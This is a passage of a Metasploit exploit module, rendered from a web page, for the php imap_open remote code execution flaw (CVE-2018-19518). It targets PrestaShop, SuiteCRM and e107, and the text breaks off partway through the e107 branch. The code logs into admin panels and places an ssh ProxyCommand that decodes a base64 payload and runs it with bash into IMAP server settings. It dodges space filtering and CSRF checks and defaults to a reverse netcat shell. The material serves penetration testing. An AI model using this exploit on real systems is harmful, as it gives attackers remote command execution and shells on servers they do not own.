class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br></pre></td><td class="code"><pre><span class="line">##</span><br><span class="line"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="line"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="line">##</span><br><span class="line"> </span><br><span class="line">class MetasploitModule &lt; Msf::Exploit::Remote</span><br><span class="line">  Rank = GoodRanking</span><br><span class="line"> </span><br><span class="line">  include Msf::Exploit::Remote::HttpClient</span><br><span class="line"> </span><br><span class="line">  def initialize(info = &#123;&#125;)</span><br><span class="line">    super(update_info(info,</span><br><span class="line">      &apos;Name&apos;            =&gt; &apos;php imap_open Remote Code Execution&apos;,</span><br><span class="line">      &apos;Description&apos;     =&gt; %q&#123;</span><br><span class="line">        The imap_open function within php, if called without the /norsh flag, will attempt to preauthenticate an</span><br><span class="line">        IMAP session.  On Debian based systems, including Ubuntu, rsh is mapped to the ssh binary.  Ssh&apos;s ProxyCommand</span><br><span class="line">        option can be passed from imap_open to execute arbitrary commands.</span><br><span class="line">        While many custom applications may use imap_open, this exploit works against the following applications:</span><br><span class="line">        e107 v2, prestashop, SuiteCRM, as well as Custom, which simply prints the exploit strings for use.</span><br><span class="line">        Prestashop exploitation requires the admin URI, and administrator credentials.</span><br><span class="line">        suiteCRM/e107/hostcms require administrator credentials.</span><br><span class="line">      &#125;,</span><br><span class="line">      &apos;Author&apos; =&gt;</span><br><span class="line">        [</span><br><span class="line">          &apos;Anton Lopanitsyn&apos;, # Vulnerability discovery and PoC</span><br><span class="line">          &apos;Twoster&apos;, # Vulnerability discovery and PoC</span><br><span class="line">          &apos;h00die&apos; # Metasploit Module</span><br><span class="line">        ],</span><br><span class="line">      &apos;License&apos;         =&gt; MSF_LICENSE,</span><br><span class="line">      &apos;References&apos;      =&gt;</span><br><span class="line">        [</span><br><span class="line">          [ &apos;URL&apos;, &apos;https://web.archive.org/web/20181118213536/https://antichat.com/threads/463395&apos; ],</span><br><span class="line">          [ &apos;URL&apos;, &apos;https://github.com/Bo0oM/PHP_imap_open_exploit&apos; ],</span><br><span class="line">          [ &apos;EDB&apos;, &apos;45865&apos;],</span><br><span class="line">          [ &apos;URL&apos;, &apos;https://bugs.php.net/bug.php?id=76428&apos;],</span><br><span class="line">          [ &apos;CVE&apos;, &apos;2018-19518&apos;]</span><br><span class="line">        ],</span><br><span class="line">      &apos;Privileged&apos;  =&gt; false,</span><br><span class="line">      &apos;Platform&apos;  =&gt; [ &apos;unix&apos; ],</span><br><span class="line">      &apos;Arch&apos;  =&gt; ARCH_CMD,</span><br><span class="line">      &apos;Targets&apos; =&gt;</span><br><span class="line">        [</span><br><span class="line">          [ &apos;prestashop&apos;, &#123;&#125; ],</span><br><span class="line">          [ &apos;suitecrm&apos;, &#123;&#125;],</span><br><span class="line">          [ &apos;e107v2&apos;, &#123;&apos;WfsDelay&apos; =&gt; 90&#125;], # may need to wait for cron</span><br><span class="line">          [ &apos;custom&apos;, &#123;&apos;WfsDelay&apos; =&gt; 300&#125;]</span><br><span class="line">        ],</span><br><span class="line">      &apos;PrependFork&apos; =&gt; true,</span><br><span class="line">      &apos;DefaultOptions&apos; =&gt;</span><br><span class="line">        &#123;</span><br><span class="line">          &apos;PAYLOAD&apos; =&gt; &apos;cmd/unix/reverse_netcat&apos;,</span><br><span class="line">          &apos;WfsDelay&apos; =&gt; 120</span><br><span class="line">        &#125;,</span><br><span class="line">      &apos;DefaultTarget&apos;  =&gt; 0,</span><br><span class="line">      &apos;DisclosureDate&apos; =&gt; &apos;Oct 23 2018&apos;))</span><br><span class="line"> </span><br><span class="line">    register_options(</span><br><span class="line">      [</span><br><span class="line">        OptString.new(&apos;TARGETURI&apos;, [ true, &quot;Base directory path&quot;, &apos;/admin2769gx8k3&apos;]),</span><br><span class="line">        OptString.new(&apos;USERNAME&apos;, [ false, &quot;Username to authenticate with&quot;, &apos;&apos;]),</span><br><span class="line">        OptString.new(&apos;PASSWORD&apos;, [ false, &quot;Password to authenticate with&quot;, &apos;&apos;])</span><br><span class="line">      ])</span><br><span class="line">  end</span><br><span class="line"> </span><br><span class="line">  def check</span><br><span class="line">   if target.name =~ /prestashop/</span><br><span class="line">      uri = normalize_uri(target_uri.path)</span><br><span class="line">      res = send_request_cgi(&#123;&apos;uri&apos; =&gt; uri&#125;)</span><br><span class="line">      if res &amp;&amp; (res.code == 301 || res.code == 302)</span><br><span class="line">       return CheckCode::Detected</span><br><span class="line">      end</span><br><span class="line">    elsif target.name =~ /suitecrm/</span><br><span class="line">      #login page GET /index.php?action=Login&amp;module=Users</span><br><span class="line">      vprint_status(&apos;Loading login page&apos;)</span><br><span class="line">      res = send_request_cgi(</span><br><span class="line">        &apos;uri&apos; =&gt; normalize_uri(target_uri.path, &apos;index.php&apos;),</span><br><span class="line">        &apos;vars_get&apos; =&gt; &#123;</span><br><span class="line">          &apos;action&apos; =&gt; &apos;Login&apos;,</span><br><span class="line">          &apos;module&apos; =&gt; &apos;Users&apos;</span><br><span class="line">        &#125;</span><br><span class="line">      )</span><br><span class="line">      unless res</span><br><span class="line">        print_error(&apos;Error loading site.  Check options.&apos;)</span><br><span class="line">        return</span><br><span class="line">      end</span><br><span class="line"> </span><br><span class="line">      if res.code = 200</span><br><span class="line">        return CheckCode::Detected</span><br><span class="line">      end</span><br><span class="line">   end</span><br><span class="line">   CheckCode::Safe</span><br><span class="line">  end</span><br><span class="line"> </span><br><span class="line">  def command(spaces=&apos;$IFS$()&apos;)</span><br><span class="line">    #payload is base64 encoded, and stuffed into the SSH option.</span><br><span class="line">    enc_payload = Rex::Text.encode_base64(payload.encoded)</span><br><span class="line">    command = &quot;-oProxyCommand=`echo #&#123;enc_payload&#125;|base64 -d|bash`&quot;</span><br><span class="line">    #final payload can not contain spaces, however $IFS$() will return the space we require</span><br><span class="line">    command.gsub!(&apos; &apos;, spaces)</span><br><span class="line">  end</span><br><span class="line"> </span><br><span class="line">  def exploit</span><br><span class="line">    if target.name =~ /prestashop/</span><br><span class="line">      uri = normalize_uri(target_uri.path)</span><br><span class="line">      res = send_request_cgi(&#123;&apos;uri&apos; =&gt; uri&#125;)</span><br><span class="line">      if res &amp;&amp; res.code != 301</span><br><span class="line">        print_error(&apos;Admin redirect not found, check URI.  Should be something similar to /admin2769gx8k3&apos;)</span><br><span class="line">        return</span><br><span class="line">      end</span><br><span class="line"> </span><br><span class="line">      #There are a bunch of redirects that happen, so we automate going through them to get to the login page.</span><br><span class="line">      while res.code == 301 || res.code == 302</span><br><span class="line">        cookie = res.get_cookies</span><br><span class="line">        uri = res.headers[&apos;Location&apos;]</span><br><span class="line">        vprint_status(&quot;Redirected to #&#123;uri&#125;&quot;)</span><br><span class="line">        res = send_request_cgi(&#123;&apos;uri&apos; =&gt; uri&#125;)</span><br><span class="line">      end</span><br><span class="line"> </span><br><span class="line">      #Tokens are generated for each URL or sub-component, we need valid ones!</span><br><span class="line">      /.*token=(?&lt;token&gt;\w&#123;32&#125;)/ =~ uri</span><br><span class="line">      /id=&quot;redirect&quot; value=&quot;(?&lt;redirect&gt;.*)&quot;\/&gt;/ =~ res.body</span><br><span class="line">      cookie = res.get_cookies</span><br><span class="line"> </span><br><span class="line">      unless token &amp;&amp; redirect</span><br><span class="line">        print_error(&apos;Unable to find token and redirect URL, check options.&apos;)</span><br><span class="line">        return</span><br><span class="line">      end</span><br><span class="line"> </span><br><span class="line">      vprint_status(&quot;Token: #&#123;token&#125; and Login Redirect: #&#123;redirect&#125;&quot;)</span><br><span class="line">      print_status(&quot;Logging in with #&#123;datastore[&apos;USERNAME&apos;]&#125;:#&#123;datastore[&apos;PASSWORD&apos;]&#125;&quot;)</span><br><span class="line">      res = send_request_cgi(</span><br><span class="line">        &apos;method&apos; =&gt; &apos;POST&apos;,</span><br><span class="line">        &apos;uri&apos;    =&gt; normalize_uri(target_uri.path, &apos;index.php&apos;),</span><br><span class="line">        &apos;cookie&apos; =&gt; cookie,</span><br><span class="line">        &apos;vars_post&apos; =&gt; &#123;</span><br><span class="line">          &apos;ajax&apos; =&gt; 1,</span><br><span class="line">          &apos;token&apos; =&gt; &apos;&apos;,</span><br><span class="line">          &apos;controller&apos; =&gt; &apos;AdminLogin&apos;,</span><br><span class="line">          &apos;submitLogin&apos; =&gt; &apos;1&apos;,</span><br><span class="line">          &apos;passwd&apos; =&gt; datastore[&apos;PASSWORD&apos;],</span><br><span class="line">          &apos;email&apos; =&gt; datastore[&apos;USERNAME&apos;],</span><br><span class="line">          &apos;redirect&apos; =&gt; redirect</span><br><span class="line">        &#125;,</span><br><span class="line">        &apos;vars_get&apos; =&gt; &#123;</span><br><span class="line">          &apos;rand&apos; =&gt; &apos;1542582364810&apos; #not sure if this will hold true forever, I didn&apos;t see where it is being generated</span><br><span class="line">        &#125;</span><br><span class="line">      )</span><br><span class="line">      if res &amp;&amp; res.body.include?(&apos;Invalid password&apos;)</span><br><span class="line">        print_error(&apos;Invalid Login&apos;)</span><br><span class="line">        return</span><br><span class="line">      end</span><br><span class="line">      vprint_status(&quot;Login JSON Response: #&#123;res.body&#125;&quot;)</span><br><span class="line">      uri = JSON.parse(res.body)[&apos;redirect&apos;]</span><br><span class="line">      cookie = res.get_cookies</span><br><span class="line">      print_good(&apos;Login Success, loading admin dashboard to pull tokens&apos;)</span><br><span class="line">      res = send_request_cgi(&#123;&apos;uri&apos; =&gt; uri, &apos;cookie&apos; =&gt; cookie&#125;)</span><br><span class="line"> </span><br><span class="line">      /AdminCustomerThreads&amp;token=(?&lt;token&gt;\w&#123;32&#125;)/ =~ res.body</span><br><span class="line">      vprint_status(&quot;Customer Threads Token: #&#123;token&#125;&quot;)</span><br><span class="line">      res = send_request_cgi(&#123;</span><br><span class="line">        &apos;uri&apos; =&gt; normalize_uri(target_uri.path, &apos;index.php&apos;),</span><br><span class="line">        &apos;cookie&apos; =&gt; cookie,</span><br><span class="line">        &apos;vars_get&apos; =&gt; &#123;</span><br><span class="line">          &apos;controller&apos; =&gt; &apos;AdminCustomerThreads&apos;,</span><br><span class="line">          &apos;token&apos; =&gt; token</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line"> </span><br><span class="line">      /form method=&quot;post&quot; action=&quot;index\.php\?controller=AdminCustomerThreads&amp;token=(?&lt;token&gt;\w&#123;32&#125;)/ =~ res.body</span><br><span class="line">      print_good(&quot;Sending Payload with Final Token: #&#123;token&#125;&quot;)</span><br><span class="line">      data = Rex::MIME::Message.new</span><br><span class="line">      data.add_part(&apos;1&apos;, nil, nil, &apos;form-data; name=&quot;PS_CUSTOMER_SERVICE_FILE_UPLOAD&quot;&apos;)</span><br><span class="line">      data.add_part(&quot;Dear Customer,\n\nRegards,\nCustomer service&quot;, nil, nil, &apos;form-data; name=&quot;PS_CUSTOMER_SERVICE_SIGNATURE_1&quot;&apos;)</span><br><span class="line">      data.add_part(&quot;x #&#123;command&#125;&#125;&quot;, nil, nil, &apos;form-data; name=&quot;PS_SAV_IMAP_URL&quot;&apos;)</span><br><span class="line">      data.add_part(&apos;143&apos;, nil, nil, &apos;form-data; name=&quot;PS_SAV_IMAP_PORT&quot;&apos;)</span><br><span class="line">      data.add_part(Rex::Text.rand_text_alphanumeric(8), nil, nil, &apos;form-data; name=&quot;PS_SAV_IMAP_USER&quot;&apos;)</span><br><span class="line">      data.add_part(Rex::Text.rand_text_alphanumeric(8), nil, nil, &apos;form-data; name=&quot;PS_SAV_IMAP_PWD&quot;&apos;)</span><br><span class="line">      data.add_part(&apos;0&apos;, nil, nil, &apos;form-data; name=&quot;PS_SAV_IMAP_DELETE_MSG&quot;&apos;)</span><br><span class="line">      data.add_part(&apos;0&apos;, nil, nil, &apos;form-data; name=&quot;PS_SAV_IMAP_CREATE_THREADS&quot;&apos;)</span><br><span class="line">      data.add_part(&apos;0&apos;, nil, nil, &apos;form-data; name=&quot;PS_SAV_IMAP_OPT_POP3&quot;&apos;)</span><br><span class="line">      data.add_part(&apos;0&apos;, nil, nil, &apos;form-data; name=&quot;PS_SAV_IMAP_OPT_NORSH&quot;&apos;)</span><br><span class="line">      data.add_part(&apos;0&apos;, nil, nil, &apos;form-data; name=&quot;PS_SAV_IMAP_OPT_SSL&quot;&apos;)</span><br><span class="line">      data.add_part(&apos;0&apos;, nil, nil, &apos;form-data; name=&quot;PS_SAV_IMAP_OPT_VALIDATE-CERT&quot;&apos;)</span><br><span class="line">      data.add_part(&apos;0&apos;, nil, nil, &apos;form-data; name=&quot;PS_SAV_IMAP_OPT_NOVALIDATE-CERT&quot;&apos;)</span><br><span class="line">      data.add_part(&apos;0&apos;, nil, nil, &apos;form-data; name=&quot;PS_SAV_IMAP_OPT_TLS&quot;&apos;)</span><br><span class="line">      data.add_part(&apos;0&apos;, nil, nil, &apos;form-data; name=&quot;PS_SAV_IMAP_OPT_NOTLS&quot;&apos;)</span><br><span class="line">      data.add_part(&apos;&apos;, nil, nil, &apos;form-data; name=&quot;submitOptionscustomer_thread&quot;&apos;)</span><br><span class="line"> </span><br><span class="line">      send_request_cgi(</span><br><span class="line">        &apos;method&apos; =&gt; &apos;POST&apos;,</span><br><span class="line">        &apos;uri&apos;    =&gt; normalize_uri(target_uri.path, &apos;index.php&apos;),</span><br><span class="line">        &apos;ctype&apos;  =&gt; &quot;multipart/form-data; boundary=#&#123;data.bound&#125;&quot;,</span><br><span class="line">        &apos;data&apos;   =&gt; data.to_s,</span><br><span class="line">        &apos;cookie&apos; =&gt; cookie,</span><br><span class="line">        &apos;vars_get&apos; =&gt; &#123;</span><br><span class="line">          &apos;controller&apos; =&gt; &apos;AdminCustomerThreads&apos;,</span><br><span class="line">          &apos;token&apos; =&gt; token</span><br><span class="line">        &#125;</span><br><span class="line">      )</span><br><span class="line">      print_status(&apos;IMAP server change left on server, manual revert required.&apos;)</span><br><span class="line"> </span><br><span class="line">      if res &amp;&amp; res.body.include?(&apos;imap Is Not Installed On This Server&apos;)</span><br><span class="line">        print_error(&apos;PHP IMAP mod not installed/enabled &apos;)</span><br><span class="line">      end</span><br><span class="line">    elsif target.name =~ /suitecrm/</span><br><span class="line">      #login page GET /index.php?action=Login&amp;module=Users</span><br><span class="line">      vprint_status(&apos;Loading login page&apos;)</span><br><span class="line">      res = send_request_cgi(</span><br><span class="line">        &apos;uri&apos; =&gt; normalize_uri(target_uri.path, &apos;index.php&apos;),</span><br><span class="line">        &apos;vars_get&apos; =&gt; &#123;</span><br><span class="line">          &apos;action&apos; =&gt; &apos;Login&apos;,</span><br><span class="line">          &apos;module&apos; =&gt; &apos;Users&apos;</span><br><span class="line">        &#125;</span><br><span class="line">      )</span><br><span class="line">      unless res</span><br><span class="line">        print_error(&apos;Error loading site.  Check options.&apos;)</span><br><span class="line">        return</span><br><span class="line">      end</span><br><span class="line"> </span><br><span class="line">      if res.code = 200</span><br><span class="line">        cookie = res.get_cookies</span><br><span class="line">      else</span><br><span class="line">        print_error(&quot;HTTP code #&#123;res.code&#125; found, check options.&quot;)</span><br><span class="line">        return</span><br><span class="line">      end</span><br><span class="line"> </span><br><span class="line">      vprint_status(&quot;Logging in as #&#123;datastore[&apos;USERNAME&apos;]&#125;:#&#123;datastore[&apos;PASSWORD&apos;]&#125;&quot;)</span><br><span class="line">      res = send_request_cgi(</span><br><span class="line">        &apos;method&apos; =&gt; &apos;POST&apos;,</span><br><span class="line">        &apos;uri&apos; =&gt; normalize_uri(target_uri.path, &apos;index.php&apos;),</span><br><span class="line">        &apos;cookie&apos; =&gt; cookie,</span><br><span class="line">        &apos;vars_post&apos; =&gt; &#123;</span><br><span class="line">          &apos;module&apos; =&gt; &apos;Users&apos;,</span><br><span class="line">          &apos;action&apos; =&gt; &apos;Authenticate&apos;,</span><br><span class="line">          &apos;return_module&apos; =&gt; &apos;Users&apos;,</span><br><span class="line">          &apos;return_action&apos; =&gt; &apos;Login&apos;,</span><br><span class="line">          &apos;cant_login&apos; =&gt; &apos;&apos;,</span><br><span class="line">          &apos;login_module&apos; =&gt; &apos;&apos;,</span><br><span class="line">          &apos;login_action&apos; =&gt; &apos;&apos;,</span><br><span class="line">          &apos;login_record&apos; =&gt; &apos;&apos;,</span><br><span class="line">          &apos;login_token&apos; =&gt; &apos;&apos;,</span><br><span class="line">          &apos;login_oauth_token&apos; =&gt; &apos;&apos;,</span><br><span class="line">          &apos;login_mobile&apos; =&gt; &apos;&apos;,</span><br><span class="line">          &apos;user_name&apos; =&gt; datastore[&apos;USERNAME&apos;],</span><br><span class="line">          &apos;username_password&apos; =&gt; datastore[&apos;PASSWORD&apos;],</span><br><span class="line">          &apos;Login&apos; =&gt; &apos;Log+In&apos;</span><br><span class="line">        &#125;</span><br><span class="line">      )</span><br><span class="line">      unless res</span><br><span class="line">        print_error(&apos;Error loading site.  Check options.&apos;)</span><br><span class="line">        return</span><br><span class="line">      end</span><br><span class="line"> </span><br><span class="line">      if res.code = 302</span><br><span class="line">        cookie = res.get_cookies</span><br><span class="line">        print_good(&apos;Login Success&apos;)</span><br><span class="line">      else</span><br><span class="line">        print_error(&apos;Failed Login, check options.&apos;)</span><br><span class="line">      end</span><br><span class="line"> </span><br><span class="line">      #load the email settings page to get the group_id</span><br><span class="line">      vprint_status(&apos;Loading InboundEmail page&apos;)</span><br><span class="line">      res = send_request_cgi(</span><br><span class="line">        &apos;uri&apos; =&gt; normalize_uri(target_uri.path, &apos;index.php&apos;),</span><br><span class="line">        &apos;cookie&apos; =&gt; cookie,</span><br><span class="line">        &apos;vars_get&apos; =&gt; &#123;</span><br><span class="line">          &apos;module&apos; =&gt; &apos;InboundEmail&apos;,</span><br><span class="line">          &apos;action&apos; =&gt; &apos;EditView&apos;</span><br><span class="line">        &#125;</span><br><span class="line">      )</span><br><span class="line"> </span><br><span class="line">      unless res</span><br><span class="line">        print_error(&apos;Error loading site.&apos;)</span><br><span class="line">        return</span><br><span class="line">      end</span><br><span class="line"> </span><br><span class="line">      /&quot;group_id&quot; value=&quot;(?&lt;group_id&gt;\w&#123;8&#125;-\w&#123;4&#125;-\w&#123;4&#125;-\w&#123;4&#125;-\w&#123;12&#125;)&quot;&gt;/ =~ res.body</span><br><span class="line"> </span><br><span class="line">      unless group_id</span><br><span class="line">        print_error(&apos;Could not identify group_id from form page&apos;)</span><br><span class="line">        return</span><br><span class="line">      end</span><br><span class="line"> </span><br><span class="line">      print_good(&quot;Sending payload with group_id #&#123;group_id&#125;&quot;)</span><br><span class="line"> </span><br><span class="line">      referer = &quot;http://#&#123;datastore[&apos;RHOST&apos;]&#125;#&#123;normalize_uri(target_uri.path, &apos;index.php&apos;)&#125;?module=InboundEmail&amp;action=EditView&quot;</span><br><span class="line">      res = send_request_cgi(</span><br><span class="line">        &apos;method&apos; =&gt; &apos;POST&apos;,</span><br><span class="line">        &apos;uri&apos; =&gt; normalize_uri(target_uri.path, &apos;index.php&apos;),</span><br><span class="line">        &apos;cookie&apos; =&gt; cookie,</span><br><span class="line">        #required to prevent CSRF protection from triggering</span><br><span class="line">        &apos;headers&apos; =&gt; &#123; &apos;Referer&apos; =&gt; referer&#125;,</span><br><span class="line">        &apos;vars_post&apos; =&gt; &#123;</span><br><span class="line">          &apos;module&apos; =&gt; &apos;InboundEmail&apos;,</span><br><span class="line">          &apos;record&apos; =&gt; &apos;&apos;,</span><br><span class="line">          &apos;origin_id&apos; =&gt; &apos;&apos;,</span><br><span class="line">          &apos;isDuplicate&apos; =&gt; &apos;false&apos;,</span><br><span class="line">          &apos;action&apos; =&gt; &apos;Save&apos;,</span><br><span class="line">          &apos;group_id&apos; =&gt; group_id,</span><br><span class="line">          &apos;return_module&apos; =&gt; &apos;&apos;,</span><br><span class="line">          &apos;return_action&apos; =&gt; &apos;&apos;,</span><br><span class="line">          &apos;return_id&apos; =&gt; &apos;&apos;,</span><br><span class="line">          &apos;personal&apos; =&gt; &apos;&apos;,</span><br><span class="line">          &apos;searchField&apos; =&gt; &apos;&apos;,</span><br><span class="line">          &apos;mailbox_type&apos; =&gt; &apos;&apos;,</span><br><span class="line">          &apos;button&apos; =&gt; &apos;  Save  &apos;,</span><br><span class="line">          &apos;name&apos; =&gt; Rex::Text.rand_text_alphanumeric(8),</span><br><span class="line">          &apos;status&apos; =&gt; &apos;Active&apos;,</span><br><span class="line">          &apos;server_url&apos; =&gt; &quot;x #&#123;command&#125;&#125;&quot;,</span><br><span class="line">          &apos;email_user&apos; =&gt; Rex::Text.rand_text_alphanumeric(8),</span><br><span class="line">          &apos;protocol&apos; =&gt; &apos;imap&apos;,</span><br><span class="line">          &apos;email_password&apos; =&gt; Rex::Text.rand_text_alphanumeric(8),</span><br><span class="line">          &apos;port&apos; =&gt; &apos;143&apos;,</span><br><span class="line">          &apos;mailbox&apos; =&gt; &apos;INBOX&apos;,</span><br><span class="line">          &apos;trashFolder&apos; =&gt; &apos;TRASH&apos;,</span><br><span class="line">          &apos;sentFolder&apos; =&gt; &apos;&apos;,</span><br><span class="line">          &apos;from_name&apos; =&gt; Rex::Text.rand_text_alphanumeric(8),</span><br><span class="line">          &apos;is_auto_import&apos; =&gt; &apos;on&apos;,</span><br><span class="line">          &apos;from_addr&apos; =&gt; &quot;#&#123;Rex::Text.rand_text_alphanumeric(8)&#125;@#&#123;Rex::Text.rand_text_alphanumeric(8)&#125;.org&quot;,</span><br><span class="line">          &apos;reply_to_name&apos; =&gt; &apos;&apos;,</span><br><span class="line">          &apos;distrib_method&apos; =&gt; &apos;AOPDefault&apos;,</span><br><span class="line">          &apos;distribution_user_name&apos; =&gt; &apos;&apos;,</span><br><span class="line">          &apos;distribution_user_id&apos; =&gt; &apos;&apos;,</span><br><span class="line">          &apos;distribution_options[0]&apos; =&gt; &apos;all&apos;,</span><br><span class="line">          &apos;distribution_options[1]&apos; =&gt; &apos;&apos;,</span><br><span class="line">          &apos;distribution_options[2]&apos; =&gt; &apos;&apos;,</span><br><span class="line">          &apos;create_case_template_id&apos; =&gt; &apos;&apos;,</span><br><span class="line">          &apos;reply_to_addr&apos; =&gt; &apos;&apos;,</span><br><span class="line">          &apos;template_id&apos; =&gt; &apos;&apos;,</span><br><span class="line">          &apos;filter_domain&apos; =&gt; &apos;&apos;,</span><br><span class="line">          &apos;email_num_autoreplies_24_hours&apos; =&gt; &apos;10&apos;,</span><br><span class="line">          &apos;leaveMessagesOnMailServer&apos; =&gt; &apos;1&apos;</span><br><span class="line">        &#125;</span><br><span class="line">      )</span><br><span class="line">      if res &amp;&amp; res.code == 200</span><br><span class="line">        print_error(&apos;Triggered CSRF protection, may try exploitation manually.&apos;)</span><br><span class="line">      end</span><br><span class="line">      print_status(&apos;IMAP server config left on server, manual removal required.&apos;)</span><br><span class="line">    elsif target.name =~ /e107v2/</span><br><span class="line">      # e107 has an encoder which prevents $IFS$() from being used as $ = &amp;#036;</span><br><span class="line">      # \t also became /t, however &quot;\t&quot; does seem to work.</span><br><span class="line"> </span><br><span class="line">      # e107 also uses a cron job to check bounce jobs, which may not be active.</span><br><span class="line">      # either cron can be disabled, or bounce checks disabled, so we try to</span><br><span class="line">      # kick the process manually, however if it doesn&apos;t work we&apos;ll hope</span><br><span class="line">      # cron is running and we get a call back anyways.</span><br><span class="line"> </span><br><span class="line">      vprint_status(&quot;Logging in as #&#123;datastore[&apos;USERNAME&apos;]&#125;:#&#123;datastore[&apos;PASSWORD&apos;]&#125;&quot;)</span><br><span class="line">      res = send_request_cgi(</span><br><span class="line">        &apos;method&apos; =&gt; &apos;POST&apos;,</span><br><span class="line">        &apos;uri&apos; =&gt; normalize_uri(target_uri.path, &apos;e107_admin&apos;, &apos;admin.php&apos;),</span><br><span class="line">        &apos;vars_post&apos; =&gt; &#123;</span><br><span class="line">          &apos;authname&apos; =&gt; datastore[&apos;USERNAME&apos;],</span><br><span class="line">          &apos;authpass&apos; =&gt; datastore[&apos;PASSWORD&apos;],</span><br><span class="line">          &apos;authsubmit&apos; =&gt; &apos;Log In&apos;</span><br><span class="line">      &#125;)</span><br><span class="line">      unless res</span><br><span class="line">        print_error(&apos;Error loading site.  Check options.&apos;)</span><br><span class="line">        return</span><br><span class="line">      end</span><br><span class="line"> </span><br><span class="line">      if res.code == 302</span><br><span class="line">        cookie = res.get_cookies</span><br><span class="line">        print_good(&apos;Login Success&apos;)</span><br><span class="line">      else</span><br><span class="line">        print_error(&apos;Failed Login, check options.&apos;)</span><br><span class="line">      end</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">      vprint_status(&apos;Checking if Cron is enabled for triggering&apos;)</span><br><span class="line">      res = send_request_cgi(</span><br><span class="line">        &apos;uri&apos; =&gt; normalize_uri(target_uri.path, &apos;e107_admin&apos;, &apos;cron.php&apos;),</span><br><span class="line">        &apos;cookie&apos; =&gt; cookie</span><br><span class="line">      )</span><br><span class="line">      unless res</span><br><span class="line">        print_error(&apos;Error loading site.  Check options.&apos;)</span><br><span class="line">        return</span><br><span 